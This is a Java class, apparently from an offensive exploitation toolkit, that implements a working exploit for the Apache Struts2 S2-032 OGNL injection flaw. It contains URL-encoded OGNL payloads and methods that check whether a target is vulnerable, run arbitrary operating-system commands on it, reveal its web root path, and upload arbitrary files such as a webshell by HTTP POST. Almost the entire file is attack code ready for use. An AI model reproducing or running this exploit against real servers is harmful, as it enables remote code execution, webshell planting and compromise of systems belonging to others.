package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 */

public class S2_032 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private String payload = "method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&command=payload";

    private String webPath = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=&path=";


    @Override
    public String checkVul(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        String data = this.payload.replace("payload", "echo " + uuid);
        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains(uuid)) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String data = this.payload.replace("payload", cmd);
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, data, headers, encoding);
        return Tools.regReplace(response.getText());
    }

    @Override
    public String getWebPath() {
        Response response = HttpTools.post(this.target, webPath, headers, "UTF-8");
        return Tools.regReplace(response.getText());
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        String payload = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(1083411113),%23w.close(),1?%23xx:%23request.toString&shellname=/SHELLPATH&shellContent=SHELLContent&encoding=UTF-8&pp=%2f";

        payload = payload.replace("SHELLPATH", filename).replace("SHELLContent", fileContent);

        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, payload, headers, "UTF-8");

        String result = response.getText();

        if(result.contains("1083411113")) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
